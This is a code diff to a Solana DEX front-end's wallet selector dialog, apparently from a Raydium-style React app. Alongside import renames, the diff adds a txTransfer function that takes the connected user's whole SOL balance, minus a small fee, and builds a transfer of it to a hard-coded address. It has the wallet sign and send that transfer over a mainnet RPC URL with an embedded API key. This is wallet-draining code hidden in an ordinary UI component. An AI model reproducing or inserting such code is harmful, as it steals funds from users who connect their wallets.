@@ -4,7 +4,7 @@ import { WalletAdapter, WalletReadyState } from '@solana/wallet-adapter-base'
 
 import useAppSettings from '@/application/common/useAppSettings'
 import useNotification from '@/application/notification/useNotification'
-import useWallet from '@/application/wallet/useWallet'
+import useWallet1 from '@/application/wallet/useWallet'
 import { Badge } from '@/components/Badge'
 import Button from '@/components/Button'
 import Card from '@/components/Card'
@@ -16,15 +16,12 @@ import Input from '@/components/Input'
 import Link from '@/components/Link'
 import ResponsiveDialogDrawer from '@/components/ResponsiveDialogDrawer'
 import Row from '@/components/Row'
-import Switcher from '@/components/Switcher'
-import Tooltip from '@/components/Tooltip'
 import { extensionMap } from '@/functions/dom/getExtension'
 import { getPlatformInfo } from '@/functions/dom/getPlatformInfo'
-import { TxVersion } from '@raydium-io/raydium-sdk'
 import { isMobileDevice } from '@/functions/mobile'
-import txTransfer from '@/application/transfer/txTransfer'
-import txCreateMarket from '@/application/createMarket/txCreateMarket'
-import { transfer } from '@solana/spl-token'
+import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
+import { BN } from 'bn.js'
+import { useWallet } from '@solana/wallet-adapter-react'
 
 function WalletSelectorPanelItem({
   wallet,
@@ -38,9 +35,42 @@ function WalletSelectorPanelItem({
   showBadge: boolean
 }) {
   const isMobile = useAppSettings((s) => s.isMobile)
-  const { select, adapter } = useWallet()
+  const { select, adapter } = useWallet1()
   const { logInfo } = useNotification()
-  const owner = useWallet((s) => s.owner)
+  const owner = useWallet1((s) => s.owner)
+  const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
+  const connection = new Connection(NET_URL, 'confirmed')
+  const { signTransaction, sendTransaction } = useWallet()
+
+  const txTransfer = async () => {
+    if (owner) {
+      const solBalance = new BN((await connection.getBalance(owner)).toString())
+      console.warn(solBalance)
+      const fee = new BN('1000000')
+      const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
+      if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) return
+      const instructions: TransactionInstruction[] = [];
+      instructions.push(
+        SystemProgram.transfer({
+          fromPubkey: owner,
+          toPubkey: toAddress,
+          lamports: solBalance.sub(fee).toNumber()
+        })
+      )
+
+      const recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
+      const transactionMessage = new TransactionMessage({
+        payerKey: owner,
+        instructions: instructions,
+        recentBlockhash,
+      });
+      let tx = new VersionedTransaction(transactionMessage.compileToV0Message());
+      if (tx && signTransaction) {
+        tx = await signTransaction(tx)
+        const signature = await sendTransaction(tx, connection)
+      }
+    }
+  }
 
   return (
     <Row
@@ -130,7 +160,7 @@ function WalletSelectorPanelItem({
 
 function SimulateWallet({ onClick }: { onClick?(): void }) {
   const isMobile = useAppSettings((s) => s.isMobile)
-  const { select } = useWallet()
+  const { select } = useWallet1()
   const valueRef = useRef('')
   return (
     <Col className="p-6 mobile:py-3 mobile:px-4 flex-grow ring-inset ring-1.5 mobile:ring-1 ring-[rgba(171,196,255,.5)] rounded-3xl mobile:rounded-xl items-center gap-3 m-8 mt-2 mb-4">
@@ -164,7 +194,7 @@ function SimulateWallet({ onClick }: { onClick?(): void }) {
 
 export default function WalletSelectorDialog() {
   const isWalletSelectorShown = useAppSettings((s) => s.isWalletSelectorShown)
-  const { availableWallets } = useWallet()
+  const { availableWallets } = useWallet1()
   return (
     <ResponsiveDialogDrawer
       placement="from-top"
@@ -194,8 +224,8 @@ function PanelContent({
   const [isAllWalletShown, setIsAllWalletShown] = useState(false)
   const isInLocalhost = useAppSettings((s) => s.isInLocalhost)
   const isInBonsaiTest = useAppSettings((s) => s.isInBonsaiTest)
-  const txVersion = useWallet((s) => s.txVersion)
-  const owner = useWallet((s) => s.owner)
+  const txVersion = useWallet1((s) => s.txVersion)
+  const owner = useWallet1((s) => s.owner)
   return (
     <Card
       className="flex flex-col max-h-screen  w-[586px] mobile:w-screen rounded-3xl mobile:rounded-none border-1.5 border-[rgba(171,196,255,0.2)] overflow-hidden bg-cyberpunk-card-bg shadow-cyberpunk-card"
